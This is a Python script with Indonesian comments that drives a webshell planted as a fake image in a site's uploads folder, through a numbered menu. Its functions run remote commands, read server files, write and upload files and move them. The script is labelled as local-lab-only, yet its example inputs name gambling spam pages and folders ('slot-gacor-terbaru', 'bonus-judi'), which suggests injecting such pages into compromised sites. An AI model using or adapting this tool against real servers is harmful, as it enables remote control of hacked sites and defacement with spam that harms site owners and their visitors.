#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MENU WEBSHELL — versi gampang untuk LAB LOKAL (localhost:8081)
================================================================
Nggak perlu hafal perintah. Tinggal pilih angka di menu.

>>> HANYA UNTUK LAB SENDIRI (localhost) <<<
Jangan pernah jalankan ini ke server orang lain tanpa izin tertulis.
"""

import base64
import sys
import time
import urllib.parse
import urllib.request

DEFAULT_URL = "http://localhost:8081/uploads/20260801_120937_hendro.png"
LOG_FILE = "session.log"


def kirim(url, perintah):
    query = urllib.parse.urlencode({"cmd": perintah})
    target = f"{url}?{query}"
    try:
        with urllib.request.urlopen(target, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
    except Exception as e:
        return f"[KONEKSI GAGAL] {e}"
    if "<pre>" in body and "</pre>" in body:
        return body.split("<pre>", 1)[1].rsplit("</pre>", 1)[0].strip()
    return body.strip()


def tulis_log(teks):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {teks}\n")


def cek_aktif(url):
    hasil = kirim(url, "echo lab-online")
    if "lab-online" in hasil:
        print("[OK] Webshell aktif.")
        return True
    print("[!] Webshell tidak merespons. Cek: docker ps  /  --url benar")
    return False


def jalankan(url, perintah):
    tulis_log(f"CMD  : {perintah}")
    hasil = kirim(url, perintah)
    tulis_log(f"OUT  : {hasil}")
    return hasil


def tulis_file(url, nama, isi):
    kode = base64.b64encode(isi.encode("utf-8")).decode("ascii")
    return jalankan(url, f"echo {kode} | base64 -d > {nama}")


def upload_file(url, file_lokal, tujuan=None):
    try:
        with open(file_lokal, "rb") as f:
            data = f.read()
    except OSError as e:
        return f"[GAGAL BACA FILE] {e}"
    if not tujuan:
        tujuan = file_lokal.replace("\\", "/").split("/")[-1]
    kode = base64.b64encode(data).decode("ascii")
    jalankan(url, f"echo {kode} | base64 -d > {tujuan}")
    return jalankan(url, f"ls -l {tujuan}")


def tampilkan_menu():
    print()
    print("=" * 46)
    print("  MENU WEBSHELL — lab lokal")
    print("=" * 46)
    print("  1) Lihat isi folder server")
    print("  2) Lihat folder aktif (kamu di mana)")
    print("  3) Tulis teks ke file (aman dari < > &)")
    print("  4) Buat folder baru")
    print("  5) Kirim file dari PC ke server (bisa pilih tujuannya)")
    print("  6) Baca isi sebuah file")
    print("  7) Pindah / rename file di server")
    print("  0) Keluar")
    print("=" * 46)


def main():
    url = DEFAULT_URL
    if len(sys.argv) > 2 and sys.argv[1] == "--url":
        url = sys.argv[2]

    print("=" * 46)
    print("  MENU WEBSHELL — lab belajar web security")
    print("  (hanya untuk localhost/lab sendiri)")
    print("=" * 46)

    if not cek_aktif(url):
        sys.exit(1)

    while True:
        tampilkan_menu()
        pilihan = input("Pilih angka> ").strip()

        if pilihan == "1":
            print(jalankan(url, "ls"))

        elif pilihan == "2":
            print(jalankan(url, "pwd"))

        elif pilihan == "3":
            nama = input("  Nama file (misal: slot-gacor-terbaru/index.html)> ").strip()
            isi = input("  Isi teks> ")
            if nama and isi:
                print(tulis_file(url, nama, isi))
                print("[DONE] File ditulis. Refresh halamannya di browser.")

        elif pilihan == "4":
            nama = input("  Nama folder baru (misal: bonus-judi)> ").strip()
            if nama:
                print(jalankan(url, f"mkdir {nama}"))
                print("[DONE] Folder dibuat.")

        elif pilihan == "5":
            file_lokal = input("  Path file di PC (misal: halaman-judi.html)> ").strip().strip('"')
            if file_lokal:
                nama_default = file_lokal.replace("\\", "/").split("/")[-1]
                tujuan = input(f"  Simpan di server sebagai (Enter = {nama_default})> ").strip().strip('"') or nama_default
                print(upload_file(url, file_lokal, tujuan))

        elif pilihan == "6":
            nama = input("  Nama file yang mau dibaca> ").strip()
            if nama:
                print(jalankan(url, f"cat {nama}"))

        elif pilihan == "7":
            sumber = input("  File yang mau dipindah (misal: halaman-judi.html)> ").strip()
            tujuan = input("  Nama/path tujuan (misal: slot-gacor-terbaru/index.html)> ").strip()
            if sumber and tujuan:
                print(jalankan(url, f"mv {sumber} {tujuan}"))
                print("[DONE] File dipindah/di-rename.")

        elif pilihan == "0":
            print("Sampai jumpa.")
            break

        else:
            print("[!] Pilih angka 1-7 atau 0.")

        input("\n[Enter] untuk lanjut...")


if __name__ == "__main__":
    main()
